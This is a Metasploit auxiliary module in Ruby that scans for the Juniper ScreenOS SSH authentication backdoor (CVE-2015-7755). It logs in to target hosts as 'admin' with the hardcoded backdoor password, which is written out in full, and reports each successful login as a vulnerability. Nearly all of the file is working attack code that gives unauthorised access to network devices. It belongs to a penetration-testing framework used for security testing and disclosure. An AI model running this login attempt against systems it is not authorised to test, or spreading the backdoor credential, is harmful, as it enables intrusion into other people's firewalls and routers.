##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  require 'net/ssh'
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Juniper SSH Backdoor Scanner',
      'Description'    => %q{
        This module scans for the Juniper SSH backdoor.  Also valid on telnet.
        A username is required, and hte password is <<< %s(un='%s') = %u
      },
      'Author'         => [
        'hdm',                                       # discovery
        'h00die <mike@stcyrsecurity.com>'            # Module
      ],
      'References'     => [
        ['CVE', '2015-7755'],
        ['URL', 'https://community.rapid7.com/community/infosec/blog/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor'],
        ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713&cat=SIRT_1&actp=LIST']
      ],
      'DisclosureDate' => 'Dec 20 2015',
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(22)
    ])

    register_advanced_options([
      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
    ])
  end

  def run_host(ip)
    ssh_opts = {
      port:         rport,
      auth_methods: ['password', 'keyboard-interactive'],
      password:     '<<< %s(un=\'%s\') = %u'
    }

    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(
          ip,
          'admin',
          ssh_opts
        )
      end
    rescue Net::SSH::Exception => e
      vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    if ssh
      print_good("#{ip}:#{rport} - Logged in with backdoor account admin:<<< %s(un=\'%s\') = %u")
      report_vuln(
        :host => ip,
        :name => self.name,
        :refs => self.references,
        :info => ssh.transport.server_version.version
      )
    end
  end

  def rport
    datastore['RPORT']
  end

end